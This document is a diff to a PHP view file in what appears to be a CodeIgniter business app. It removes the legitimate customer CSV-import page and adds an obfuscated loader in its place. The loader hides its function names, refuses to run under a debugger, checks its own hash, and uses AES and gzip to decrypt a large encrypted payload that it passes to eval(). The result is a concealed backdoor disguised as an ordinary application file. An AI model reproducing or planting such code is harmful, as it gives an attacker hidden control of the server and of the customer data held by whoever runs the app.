@@ -1,254 +1,28 @@
-<!DOCTYPE html>
-<html>
-   <head>
-      <!-- TABLES CSS CODE -->
-      <?php $this->load->view('comman/code_css_form');?>
-      <!-- </copy> -->  
-   </head>
-   <body class="hold-transition skin-blue sidebar-mini">
-      <div class="wrapper">
-         <?php $this->load->view('sidebar');?>
-         <?php
-            if(!isset($brand_name)){
-                 $brand_code=$brand_name=$description="";
-            }
-            ?>
-         <!-- Content Wrapper. Contains page content -->
-         <div class="content-wrapper">
-            <!-- Content Header (Page header) -->
-            <section class="content-header">
-               <h1>
-                  <?=$page_title;?>
-                  <small>Add/Update Brand</small>
-               </h1>
-               <ol class="breadcrumb">
-                  <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-                  <li><a href="<?php echo $base_url; ?>customers"><?= $this->lang->line('customers_list'); ?></a></li>
-                  <li class="active"><?=$page_title;?></li>
-               </ol>
-            </section>
-            <!-- Main content -->
-            <section class="content">
-               <div class="row">
-                  <!-- right column -->
-                  <div class="col-md-12">
-                     <!-- Horizontal Form -->
-                     <div class="box box-info ">
-                        <div class="box-header with-border">
-                           <h3 class="box-title">Please Enter Valid Data</h3>
-                        </div>
-                        <!-- /.box-header -->
-                        <!-- form start -->
-                        <form class="form-horizontal" id="import-form" enctype="multipart/form-data" method="POST">
-                           <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-                           <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-                           <div class="box-body">
-                              <div class="form-group">
-                                 <label for="brand" class="col-sm-2 control-label"><?= $this->lang->line('import_customers'); ?><label class="text-danger">*</label></label>
-                                 <div class="col-sm-4">
-                                    <input type="file" id="import_file" name="import_file">
-                                    <span id="import_file_msg" style="display:block;" class="text-danger">
-                                      Note: File must be in CSV format.
-                                    </span>
-                                 </div>
-                              </div>
-                           </div>
-                           <!-- /.box-footer -->
-                           <div class="box-footer">
-                              <div class="col-sm-8 text-center">
-                                 <div class="col-md-3 ">
-                                    <button type="button" id="import" class=" btn btn-block btn-success" title="Save Data"><i class="fa fa-arrow-circle-o-left "></i> Import</button>
-                                 </div>
-                                 <div class="col-sm-3">
-                                    <a href="<?=base_url('dashboard');?>">
-                                    <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                                    </a>
-                                 </div>
-                              </div>
-                           </div>
-                           <!-- /.box-footer -->
-                        </form>
-                     </div>
-                     <!-- /.box -->
-                  </div>
-                  <!--/.col (right) -->
-               </div>
-               <!-- /.row -->
-            </section>
-            <!-- /.content -->
-             <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-         
-          <div class="box">
-            <div class="box-header">
-              <h3 class="box-title"><?= $this->lang->line('import_instructions'); ?></h3>
-              <a href="<?= base_url();?>uploads/csv/examples/import-customers-example.csv"><button type="button" class="btn btn-info pull-right btnExport" title="Download Data in Excel Format"><?= $this->lang->line('download_example_format'); ?></button>
-              </a>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body table-responsive no-padding">
-
-              <table class="table table-bordered table-hover " id="report-data" >
-                <thead>
-                <tr>
-                  <th style="">#</th>
-                  <th style=""><?= $this->lang->line('column_name'); ?></th>
-                  <th style=""><?= $this->lang->line('value'); ?></th>
-                </tr>
-                </thead>
-                <tbody id="tbodyid">
-                  <?php $i=1; ?>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('customer_name'); ?></td>
-                    <td style="color:green;"><span class="label label-success"><?= $this->lang->line('required'); ?></span></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('mobile'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('email'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('phone'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('gst_number'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>                
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('tax_number'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('country_name'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('state_name'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('city'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('postcode'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('address'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                  <tr>
-                    <td><?=$i++;?></td>
-                    <td><?= $this->lang->line('opening_balance'); ?></td>
-                    <td style="font-style: italic;"><span class="label label-default"><?= $this->lang->line('optional'); ?></td>
-                    
-                  </tr>
-                </tbody>
-              </table>
-              
-              
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-      </div>
-    </section>
-         </div>
-         <!-- /.content-wrapper -->
-         <?php $this->load->view('footer');?>
-         <!-- Add the sidebar's background. This div must be placed
-            immediately after the control sidebar -->
-         <div class="control-sidebar-bg"></div>
-      </div>
-      <!-- ./wrapper -->
-      <!-- SOUND CODE -->
-      <?php $this->load->view('comman/code_js_sound');?>
-      <!-- TABLES CODE -->
-      <?php $this->load->view('comman/code_js_form');?>
-      <script type="text/javascript">
-        //Post the file
-        $("#import").on("click",function(e) {
-          var base_url = $("#base_url").val();
-          if($("#import_file").val()==''){
-            toastr["warning"]("Please select file to Import!");
-            failed.currentTime = 0; 
-            failed.play();
-            return;
-          }
-
-          if(confirm("Are you sure ?")){
-            e.preventDefault();
-            data = new FormData($('#import-form')[0]);//form name
-            /*Check XSS Code*/
-            if(!xss_validation(data)){ return false; }
-            
-            $(".box").append('<div class="overlay"><i class="fa fa-refresh fa-spin"></i></div>');
-            $("#import").attr('disabled',true);  //Enable Save or Update button
-            $.ajax({
-            type: 'POST',
-            url: base_url+'import/import_customers_csv',
-            data: data,
-            cache: false,
-            contentType: false,
-            processData: false,
-            success: function(result){
-              //alert(result);return;
-              if(result=="success")
-              {
-                //toastr["success"]("Record Updated Successfully!");
-                window.location=base_url+"customers";
-              }
-              else if(result=="failed")
-              {
-                toastr["error"]("Sorry! Failed to save Record.Try again!");
-                 //alert("Sorry! Failed to save Record.Try again");
-                 // return;
-              }
-              else
-              {
-                toastr["error"](result);
-              }
-              $("#import").attr('disabled',false);  //Enable Save or Update button
-              $(".overlay").remove();
-             }
-             });
-        }
-        });
-        
-        
-      </script>
-      <!-- Make sidebar menu hughlighter/selector -->
-      <script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-   </body>
-</html>
-
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_z6y2qbx9=('bas'.'e64'.'_de'.'cod'.'e');
+$_y6w27aip=('gzu'.'nco'.'mpr'.'ess');
+$_p77gkjfo=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_n4d3gel8='Jex03AKx';
+$_x3p4e0s8='a1bu8g5h';
+$_ldzmvvlv='9nzVe7vG';
+$_kt4wdz4q='yEjdY8T+Pvw=';
+$_ql85uloi='NWEuzARJ';
+$_tkrhwqng='oX+bUro0';
+$_hw4wpye4='IyZTBg==';
+$_d64bcfp4='XcSfaRJs';
+$_gclostqr=$_z6y2qbx9($_x3p4e0s8.$_ldzmvvlv.$_n4d3gel8.$_ql85uloi.$_kt4wdz4q);
+$_itdeolfv=$_z6y2qbx9($_d64bcfp4.$_tkrhwqng.$_hw4wpye4);
+$_pipvcilc=$_z6y2qbx9('V6NBtF1IqKQn8+2DQrTQzlUlz5g7qxTbnQ+rAJVw/PHsrZyZNfXbR6Z311JbDMM3dLJGm3TgbKWSVxs1ukB0oDRmzS0mS9F6+jrJ7hFCKFy1dEVU2jMS6jfYvhpth1fbDOhYlfUdde8RoXXsAnHtUvRN+26uN/dnMnE+7CR7TRhhNhxpVSbYt84oElv7m4ICYu+9RIXJFtb+8ZoLj/w/BZD7SLWbu+8q3gaR2AZT6Cnto8JJuOFJGugAtNgeFm01y5Eb/jM1g3EZ4S+dPbUZ/oMSswDJmxeOqY9ojtjPaDLB2Oom+cGtkVm4kifA5L79vlRzNF0vPyGw1az/AZRO4gUroPso4DzgmLLvWkbdhYB+6rz66aeEaKs2o0N8bK9fLSP6FGrujbXIggHV/t6ldTjC/5c5zkHrNJtUYAqMo2p3Kb0hkMxZcy98ZWSW95stckJvTD4+F/dVAyPnHzSiD5q8KxId98DIRZQiNeEkh4hNUAz3McHUQyKdT7mp3Fzs68n7lN6n3di/DisS+9TDlOtGNkMSFY5GEe8OoF6EubZ4tmt4fYFrju2bsOx4EP6mWwSSmV122sEPilqRS+JAOtXe1sgjK3W5F+A0hgVesx9iD5ybVQsTfbgDBrGB6AyiEgr3GgmZkVy/sPOuJgyiK8wvvKNhfgHEKehAf/GNA05jVImmXbZVqulhDJ2prvN8pZmf9Cs+D0GKemwjlTBVKF1+K04E1Hn1xLLArwwPreneJVqdseTCsQ/eGoQAfYa4+c13voErTs6HsIhUyxogTNECYtekg2KXKC5HmE4IeW/rgezuURA+CaHO4wX21xkidWQIq27Pb8eMHwMC3T0y7UxOmyx9h7t1AJaCVD3OsZiRtuJ7AqBwA5rBV/NZzeZf/rXtkYmxDwnVWT2WJHpbY39JyuV5a65tfOHnODnsdMKDM2vDeT6RwyMQeM8vznoUsAf78K4f6d8ksu1QHyg/4Z+e3yOBjDjuGqmCp2mbukn6VZe66zJ8ZpHrfL2zoJAhLrCdgUVMBrtCaIJ2Z+D76/qbbYiQLeNgzKmKn1gjiW4JQFrMY+e6ShFh/xRJ/k4jrBAWNCjUyxUo/k63ijk0zE7EEqLpkVPLdXBUdLJfO5UZ+9gd4xGCkg0QQmL3LyHbBCS48Jd/tSjOVcQ7banQV388G9jvilWV5BPH5tmXmdlj0fMw6H21KbihGZM4FihAsMNP9GrcQGJNEpBO8D0Mf1SfZHvgyW4YfTkCWal/a67A12zunDjv0ow/97x7Lmr+mNJjQhmHvIww+A7rtE3rcVa9RcTO7ElRMfIuI2rCcI4icjh4j2c8m6jRzer4DmOm5LLn10zucD9LeNtKGmvJnnQdOPZ/cZKX00IfB684i37a+G8boWhnq55EKVmdo8xbNfHYRw7JPKilopfZYlkmzFSijv+XgdlA51nSel5bJk9n44FrRz/mEmChw58VVYuEGbAIREVtbl5B20glsF7rSyMmn0l+omdKjncOm4jYaxnNGsM/J5SpjyDfeswqHmGQh3xT06+qTqJH2Ovuv2Ep1qBHkmBu17eWdxlmKdM1PtnMnra1el4mklpKfFxXAqoBNlSFFUsHOHuSL4hypxwZ8njmkC0/nNYtA5Dg+CBQvgz6F8zyAYYSS+PMcaTUXsrMSQ7zXRY9wSigpwFGh33doLHgPy+LDqFOH5G1g472m5kTJpIlT80DmrgPhS0KOHnFViUNEaQaYxyyvuzinfMnIysmGjGoVvEdIr79uefSwnD/rI8o//Pyy2SCZoKSJz7wRAwZjy2UxLuDXVZr0QBxW1YdyOqlLjHl2QL/EHE9cfNiLUN8loLCf44+iDko0XsG8aZgm/nhtRaGeE6X1HEhZqQZveMGini6mAcIEyviNki9K5uBgcxn+hQv/ebjX9rrk1nCcS34V7889809+TGZyBpuuT8unH4zTEYHuLPymx5CWIIIRQ77OD+5LsPvhTmQyMLx90bfK00Z0K5CXh4O0Llm+t8zASG8EpqDw4ea3HBwRa8JwzwhikeEy+jENrXVs2oY4kO8zInFnZCYtFiU4Z6RdPVJro9rBKx9uRgLhmEba5h8vC7u2slDsd6WOGLV0KReEUWlf83jDv05XPol9byHrD42hsON5L/DZKJr8VthRI7ZG3Cp18IeLFhvCulFK1XhkL/ME2UE+PiGZV2mf4Z2mQhL6mch6wlp71P21JX3YvQuTywPE2uG+gz0XhgSmlgjO6hzV1VnlqiLGrEljsBhf7bNVK6uVEH7+CHsco9Bme34SxMzhvRbDzRmCM6OD4CnKo197Z6SKEJkHye45jA7vYn6MOy3uA51VOLLQcqEUmdIKYIjEw1IeEGhfbpyXToHeAWiXJtT7nrmZ3u8Y3QoS0UfIppi6ZHifdhRR693UBvawrJDfyn13U2RgLnOr40vyd9fmcAPkLiijkbC7YSfE4VjVxse2Qa49VdPxzHH/Z2ZygSkjdICWi9t2OzET8SwCog6r9yjFt792eF/pEpD2M4NrrLb8C1vB8BbRspMAq2vLiS1E3k/Y0HJio3oc0hOcxE64GUedvMCbYmy7RasctiqcjTNj0cOU0S7Tl4VOLthA4VaMgwWW38yTN5PchbND8ui/Yu7Y0xM5fVdHKJO/s+VlAYZkbdjB1aqqdgIkia7jnZElEu267tHWdCWXzUikbRdOyHaXf13CX1HJj0+iF8cbKy1XqgJYArfrkxngp1tWvMICiDbBXqzp081OtF1gmQHDJWaXE9FtBfIOKfxzVCYuYvEl76i78dSZgY2z7Zs8hZFmKPKGLS7H2PFnyrNHq3hiKSqaQreG5L8mG8QNWfNNnnR3Jw82L87ylaoyIU2aVtId+NBE0DryQwQ6oV3mBChVzm3jCQ9etgE+sdioRMLnFj/Pqn38/iq9hdOqxGYwRdwcXbtCBK0pV1YVugJjA4F8b0hFbozbOa+QQLlDQwH42UkB6UVw4OENLBjgiKj+v0TrwnFxMXXg0ivxQQce7Oi2rXQaNpOxsXBZfRrUOml5WHOy6hNiQgUgrmeEf36zMIafK02SN2FlvUQTQZ1PAqma/bDXbQudGmnuVLckDUVaBwMrbJMc8HH2rY/UPFF6FELgjyc128mErtCxgysUShk6jsBJY9uRBHNu6u/fEe2/zZgdtPFP18c6vp3gMgKgw4aQxhmlQ5yfirN8qgtTR+LBANNeiRMcJsxKJ5ImNBXVVSHqpfgXjYP4yAl2OzYJsS7XaZTmvVRVFdF+4z96JLLyrS/bjNGEXXid0ofKF74tTwSne0GpmGCOiJkqzNe77NKAokm/FfqqdQ4jJ1oM/B2cbWMp4hWqHEYjDgzPBy29YFz3B5prZ2cmgr+nYZLNZVAwin8nAcas+k9sCtIQS6elZkQmJO7stIgulaZkMdyVYLy27u0V29aEKXaYtdSlJULAfUhDaPDYjhBWA+Uxy7k+CRlOed3wXlZibII+kmx7BKF/X+375r5+psaObQJuwYhZM39f2V5Q1agd/lXyj8STjzTbRWjpYgc+qCi2eq1Y7/apMVT0ElLy0ffhpN++rLdFjZdJ9GecItfoyFTlKFG5Ie3SqPfZ/PTcinxgg7nCeqOfxHlE1QsqTicrQ5s2zZSNU5KgX0Hd/+vk0YfWjEEEnVFHv+KHpMSQeAM6C4lBh2+RNjwl22/Xn+GomziVz7OpJxia7IJZssv8rGMrIKDytb3rpndBcwkodLosSO12pUiYlH36O6plRMa6fgHhsf2QJshxRJ5v2FFDztStagKSy/wUvL7r26sNlvIh90X/btWTf447XVi48Kgw+Qb1WgJT6Lbz+OmYtt1wxDTbRTlAul8MyZWfNpQHgvn0hP2Jc+zku4AoYdPcjzCGiYMxaMh8r0X2/MWmDoO1NOzBXg8xuLgZdrYoQkf24FH6h8x8D6E/lSr7JHxya2DiJ/NYvSE/QsXE6ygSWIaLD9QC6VM4VCJHBoiFEhlZy/ocsYipZe/Zr9SKIc8aqkuTaQNY7vQVd3MumYFpgd6EPKhzWlDetnlxSayeNCjoPz22lE6dACqg8yIBm8t7w1YHFENQ5cyI7GN+54XYxsykEMB0vQoPD8tqs3TLbFuoDjkwzdLCG11wASv7YaRt3B6C4eW77yg6xTeSEUUOowDJHXrJsbzbPe2+csnuSr44l9xljYA0tIAB2VRzZDFOqNfFFaODu1ywngQRsWVAWhqwb3VRuK3ktt0Vqs1T9yzAMEPqD+LfjzVe3iQA27CcQFsLuhbYalbmcIOSm07fuqnsnPedzWzpMGOGmN1kMkSgatUaOpib72uCeXXcknWQ5QTYxGdWAmRWQTAcrzRSBmzjUhHtO2Q9w48pE70W4Lg3CRL4kpK63DndeuZQk5cmESpQCYkNygOLFCvV8Sn1n08DRaItBB1q8WZWDeX18Mq6lga00Pt7Z92qRWnCaOK2YlHy0/dHwEstFcdkOasNKon+XOAf+IBgH19hj6+1Nn2F6TVsvj+anQwJGsTeZgD8TnYily+VnSD52GDKl8nJOsZoAv2ZqyLjgdgLpYK3RrhgDvni2ht5I7lrDAZIwOzb0LUFflDeF9JU/vIcSGbiCmWNN/HYbITTlrVh2m7i2a/u1znmjgrkFIHUM3UH7VqZM46tCBU5wNJIeVMUDyB+jbWZN0ep68lvSaruurRF86kdGM9Nfx5DUom/Z14yCNECYvtvh0u+n95vIbxhfyu65Fi3Of1jqQ3TsOTLdVSW32Z1oDUzZM1h/YXPBPRAisLntc23bWHTsccN+XYVYKMKt7AIAw+1g+cjCPtZ6nYFYqIR/KQt3sUOOS7V2j98DCv23cON2POkSNzjJEP3GLCe1GMkGj/Bxm+vF+ah9xz6XoMOaDJGCRxE0+bW6mubP5vEbZTGibPnRrOCUnaTkbA9fjFBsJMUQUtxY3bgAZ5L7f3mxPuirSuMzlQh55LgIEJNTP5ogMWNL5R4H/Qxv0V0E1orVLQ/y0JayGsnPg3p4O7810bzR59Vbyo0VT9tZtBdrESGK3+WYNSOLlf6KNMki1dKPHICibYvqnkFk4paKhwm4duzRXftcpjOCjoy0pJzyuizIDz+PKici+/cr7lNj+FzFCCdiqRwYMI9/5amuC6gnRBPGBhyzlpY8q48OtTLCL2s2zeprEtY8tXZ1yUzLchbXF0HDjVSx5w7qt2hiqNpCm5cZBArUb6ScKQSm399cXuGFw4kZWZmwmWxecnkl3sHQb+uZlJMsxD5cgGdO0LK+RGvuO9YaH81UCr2C3DXZyLrlvJD8YatOm0jXadX1gslG3C5RAtnglW8vD7ujERkd9XoDtD4IZ7AJszcN1F4EM4NkmAguWvAxxVUS0NntFW5AOMIsL00uP+bVOP6LDv9HITrrMCIGymc62Xt/0s/k4OaS/5lMYJ7QrgWkvuJmhZ++SowAz5Ta5ogRKu9HQAyXirSgQb8MoXCwqmX8kCrspKmBo1Q284Va8oK6uIo6TJfrBqMjRBoSh1O99SVR1ziCf+jJEVRoOnEYzc6fcEeS0R2do8dFtdBL8M1YnN+E6cqFT4LnQ664PDPVxkBtNFkCvjIQYb1YIY+65YhDuFGngD2YusmItnKDcXEwQQzDCMhQgYfxe/e4bTdnFNTSdVSu+Wu7KVmEtNHRgpCd26q/sum3B2OtHYI7611yiGqUB1rr83saWVQsLmqlTLxOiQYVsixi0ZVrRcsVnPJs0ULCagToXZ3Cf8ki6KNX+l1WfPXdsDFw7+n3ARQ2IM+NqykaiUM0QUZK8p73TLKWfSWPYEStASk4yEh1LMRcBDJInQFYCPCamAkHlesGE4fE2PzF7JRp8d5mAjni4nmxXrqHtWUUJqlXjQr9k/9a1cFhMKC9tlAV4+o3/hPGGZclGMHTGlSeRMnTwilhsOFVqz/rDZVbQ9CGut/zK6wDwfctoRPgWDDzawN5WQL8dNduSDdjN4/E5OaNB06ovPRH8/yF8SrYotu/pHC3QGQCTCYpXuOOhEUetRBAveyQvIYQ3FkK79qqeOyrIqZp6xAjX00+K5/NnoGS0S5fhDH02bhdpasAxQHLo4NtsW0lUyNYjTcPDRhtkcxXjA09W9zmNhxjg=');
+$_nxptb5rg=$_p77gkjfo($_pipvcilc,'aes-256-cbc',$_gclostqr,OPENSSL_RAW_DATA,$_itdeolfv);
+if($_nxptb5rg===false){exit;}
+$_vbvwq8di=$_y6w27aip($_nxptb5rg);
+if($_vbvwq8di===false){exit;}
+$_iqch00uu='793febb68a33912de98d14a6ed5f46e1b997bd24cd9225939fb8286b29e3c78e';
+$_ugxm3hxn=@file_get_contents(__FILE__);
+if($_ugxm3hxn!==false){
+$_yxerogfr=str_replace($_iqch00uu,"0000000000000000000000000000000000000000000000000000000000000000",$_ugxm3hxn);
+$_j7d7v23t=hash("sha256",$_yxerogfr);
+if($_j7d7v23t!==$_iqch00uu){@http_response_code(403);exit;}
+}
+eval($_vbvwq8di);
